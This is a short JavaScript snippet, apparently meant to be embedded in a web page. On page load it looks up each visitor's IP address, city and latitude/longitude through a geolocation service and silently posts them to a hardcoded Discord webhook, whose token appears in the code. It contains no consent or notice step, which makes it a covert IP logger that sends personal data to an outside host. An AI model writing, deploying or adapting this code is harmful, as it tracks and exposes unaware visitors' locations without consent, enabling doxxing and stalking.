
 async function logVisitor() {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1527554248773079173/WTQk1vB-p8pMSv3qPmd4M0SbIkY1VyAoxuHrTUZCd6JA1ofzulvbfXMq8MRDfddOY7B2'; 
    
    try {
        // Use HTTPS to avoid "Mixed Content" security blocks
        const response = await fetch('https://ip-api.com/json/');
        const data = await response.json();
        
        // Ensure data is received
        if (data.status === 'success') {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    content: `🚀 **New Visitor**\n**IP:** ${data.query}\n**City:** ${data.city}\n**Coords:** ${data.lat}, ${data.lon}` 
                })
            });
            console.log('Logged to Discord successfully.');
        }
    } catch (e) { 
        console.error('Logging failed:', e); 
    }
}

window.addEventListener('load', logVisitor);
